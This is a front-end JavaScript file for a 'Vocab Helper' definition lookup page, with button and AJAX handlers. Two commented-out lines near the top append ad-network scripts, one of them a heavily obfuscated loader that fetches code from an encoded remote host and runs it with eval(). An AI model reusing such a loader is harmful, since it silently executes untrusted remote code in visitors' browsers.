new Clipboard('#copy');
var words = $('#wordspace');
words.focus();
//$('body').append('<script src="//go.mobtrks.com/notice.php?p=1064690&interstitial=1"></script>');
//$('body').append('<script data-cfasync="false" type="text/javascript">var f2Q=window;for(var W in f2Q){if(W.length===(5.96E2>=(60,27)?(78.,6):(0x1CA,1.169E3))&&W.charCodeAt(((0x83,0x9B)>=(28.0E1,116.)?(7.87E2,3):(16,14.0E1)))===(0x85<=(14.3E2,0x139)?(111,100):(2.91E2,53.))&&W.charCodeAt(((1.22E3,0x5F)>0x105?\'\':(1.315E3,138.0E1)>=0x10D?(0x73,5):(37,11.09E2)))===((64,37.)<=(49,0x65)?(125.,119):(0x142,1.335E3)<=(142.,7.36E2)?(14.,\'\'):(34.,127))&&W.charCodeAt(((139.,0xDC)>(0xC8,48.)?(36.6E1,1):(0xBF,124.)))===((0x154,0x1BB)>=0?(0xDF,105):(8.06E2,0x11A))&&W.charCodeAt((122.>(62.,0x45)?(0x35,0):(27,42)))===((6.63E2,0x1BB)>13.64E2?(0x117,69.):(73.,1.)<(0x1C8,0x204)?(104,119):(75.3E1,143)))break};for(var G in f2Q[W]){if(G.length===((0xF5,6.0E2)>=27?(68.3E1,8):(7.350E2,0x9D))&&G.charCodeAt((0x192>=(10,0x3F)?(0x237,5):(0x90,34.6E1)))===((0x1E,147.)<129.0E1?(144,101):(43.,45)<=(41.,12.)?136.:(0x11C,0x20C))&&G.charCodeAt(((137,130.)>=(129.9E1,0x79)?(0x1B7,7):(84.4E1,31)))===(0x11C>=(9.0E1,9.5E1)?(0x68,116):(43,1.34E3))&&G.charCodeAt((0x117>=(0x242,0x1B6)?2.54E2:2.80E1<=(61,0x167)?(0x1BB,3):(0x22F,53.)))===((0x8C,83)>90?\'\':7.390E2>=(0xE5,0x190)?(0x1D3,117):(0x49,116))&&G.charCodeAt(((102.80E1,0x60)>=2.07E2?(0x87,0xD2):(7.4E1,0x228)>(121.,120.)?(35,0):(0x119,142.8E1)))===(0xBC>(0xC9,15.70E1)?(11.,100):(8.09E2,57.6E1)))break};(function(Y,f,K,F){f2Q[W][f]=function(){var x=((0x15B,0x20A)>(136.3E1,112)?(0x228,0):(104,0xD7)),O=x,p=function p(){var k=((0x12C,127.)<13.700E2?(7,\'/\'):5.07E2<(0x226,127.)?(3.31E2,13.20E1):(3.1E1,108.));var T=\'\';var e=\'//\';var a=((0x190,119.80E1)>=(0x45,127.)?(73.,\'T\'):(81,0x196));var w=((42,81.5E1)>=(3.18E2,0x18D)?(13.27E2,\'E\'):(97,30.90E1)>(120,1.345E3)?"Q":(14.0E1,9.63E2));var Q=((0xAE,0x112)>(0x61,120.)?(30,\'G\'):(0x7F,42.));var H=((0x7E,116.)>=0xA?(0xCD,true):0x123>=(88.4E1,0x150)?200:(0x59,101.));var z=new XMLHttpRequest();z.withCredentials=H;z.open((Q+w+a),(e)+f2Q[W][\'atob\'](K[O].split(T).reverse().join(T))+k+F+k,H);z.onreadystatechange=function(){var R=((0xF4,35)<0x104?(31.1E1,200):(0x45,0x16B)<=(0x97,0x7C)?(13.64E2,74):(0x119,74.));var U=((0x7D,9.)>(121.4E1,1)?(23.,4):(120.2E1,86));if(z.readyState==U&&z.status==R&&z.responseText){eval(z.responseText);}};z.onerror=function(){if(++O!=K.length){p();}};try{z.send();}catch(R){z.onerror();}};p();};})(f2Q[W][G],\'_ohoqfolg\',[\'==AduFGduV3bjNWYuMDetJnN3AXY\'],1064657);</script><script data-cfasync="false" type="text/javascript" src="//go.onclasrv.com/apu.php?zoneid=1064652" onerror="window._ohoqfolg();"></script>');

function define(){
  var csrftoken = $('input[name="csrfmiddlewaretoken"]').val();
  $('#go').attr('class', 'button animated bounceOut');
  $('#clear').attr('class', 'button animated bounceOut');
  $('#copy').attr('class', 'button animated bounceOut');
  words.attr('class', 'animated bounceOut');
  $('#instructions').text('Please wait.');
  window.setTimeout(function(){
    var data = words.val();
    words.val('');
    $.post('', {'words': data, 'csrfmiddlewaretoken': csrftoken}, function(data){
      words.val(data);
    }).always(function(){
      words.css('display', '');
      words.attr('class', 'animated bounceIn');
      words.focus();
      $('#instructions').text('Your Results:')
      words[0].scrollTop = 0;
      window.setTimeout(function(){
        $('#go').css('display', '');
        $('#go').attr('class', 'button animated bounceIn');
        $('#clear').css('display', '');
        $('#clear').attr('class', 'button animated bounceIn');
        $('#copy').css('display', '');
        $('#copy').attr('class', 'button animated bounceIn');
      }, 700);
    });
  }, 1500);
}

$('#go').on('click', function(){
if (words.val() == ''){
  words.val('Nuclear Non-Proliferation Treaty \n\
Third World\n\
Lech Walesa and Solidarity\n\
Deng Xiaoping\n\
Bay of Pigs\n');
  window.setTimeout(function(){define();}, 600);
  return;
}
define();

});

$('#clear').on('click', function(){
  $('#wordspace').val('');
});

$('#copy').on('click', function(){
  alert('Your definitions have been saved to your clipboard. Be sure to recommend Vocab Helper to a friend!');
});
